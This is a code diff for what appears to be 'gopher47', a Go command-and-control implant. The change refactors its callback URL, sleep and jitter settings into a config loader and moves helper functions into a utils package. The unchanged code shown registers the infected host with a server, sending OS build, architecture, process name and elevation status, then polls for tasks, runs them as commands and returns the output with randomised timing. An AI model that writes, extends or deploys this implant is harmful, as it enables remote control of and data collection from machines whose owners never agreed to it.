@@ -15,16 +15,19 @@ import (
 	"time"
 
 	"github.com/An00bRektn/gopher47/pkg/agentfuncs"
+	"github.com/An00bRektn/gopher47/pkg/utils"
 	"github.com/elastic/go-sysinfo"
 )
 
 // Globals
 // Only HTTP for now
-var url = "http://127.0.0.1:80/"
-var sleepTime = 3
-var jitterRange = 100
+var c = utils.GetConfig()
+var url = c.Url
+var sleepTime = c.SleepTime
+var jitterRange = c.JitterRange
 var magicBytes = []byte("\x63\x61\x66\x65")
-var agentId = genHeader(4)
+// agentId set in main() because random seeding
+var agentId = ""
 
 func checkError(e error){
 	if e != nil {
@@ -65,7 +68,7 @@ func registerAgent(url string, magic []byte, agentId string) string{
 		"Process Elevated": "0",
 		"OS Build": hostInfo.OS.Build,
 		"OS Arch": hostInfo.Architecture,
-		"Sleep": "1",
+		"Sleep": strconv.Itoa(c.SleepTime),
 		"Process Name": procInfo.Name,
 		"OS Version": hostInfo.OS.Name + " " + hostInfo.OS.Version,
 	}
@@ -152,6 +155,7 @@ func RunCommand(command string) string {
 
 func main(){
 	rand.Seed(time.Now().UnixNano())
+	agentId = genHeader(4)
 
 	// Attempt to register
 	registered := "failed"
@@ -169,24 +173,10 @@ func main(){
 		command = checkIn("", "gettask")
 		if (len(command) > 4) {
 			fmt.Println("[*] New Task: " + command)
-			out = RunCommand(Strip(command[4:]))
-			checkIn(jsonEscape(out), "commandoutput")
+			out = RunCommand(utils.Strip(command[4:]))
+			checkIn(utils.JsonEscape(out), "commandoutput")
 		}
 		r = rand.Intn(jitterRange)
 		time.Sleep((time.Duration(sleepTime) * time.Second) + (time.Duration(r) * time.Microsecond))
 	}
-}
-
-func Strip(dirtyString string) string {
-	return strings.TrimSpace(string(bytes.Trim([]byte(dirtyString), "\x00")))
-}
-
-// https://stackoverflow.com/questions/51691901/how-do-you-escape-characters-within-a-string-json-format
-func jsonEscape(i string) string {
-    b, err := json.Marshal(i)
-    if err != nil {
-        panic(err)
-    }
-    // Trim the beginning and trailing " character
-    return string(b[1:len(b)-1])
 }
